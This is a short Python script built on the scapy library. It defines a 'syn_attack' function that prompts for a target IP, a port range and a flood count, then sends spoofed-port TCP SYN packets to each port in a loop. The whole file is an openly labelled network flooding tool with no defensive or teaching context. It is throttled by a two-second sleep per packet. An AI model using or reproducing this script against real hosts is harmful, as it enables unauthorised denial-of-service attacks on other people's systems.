from scapy.all import *
import random
from time import sleep
from utils import get_tcpdump



def syn_attack():
	port1 = int(input("First port to scan: "))
	port2 = int(input("Last port to scan: "))
	targetIP = input("Target Ip: ")
	timestoFlood = input("Number of the flood: ")

	ctr = 0
	while ctr < int(timestoFlood):
		for port in range(port1, port2+1):
			a=IP(dst=targetIP)/TCP(flags="S",  sport=RandShort(),  
			dport=port)
			print("SYN Attack is starting.")
			tcp = get_tcpdump(targetIP)
			sleep(2)
			send(a,  verbose=0) # Sends the Packet
			ctr += 1
			# print(str(ctr) + " Packet Sent")

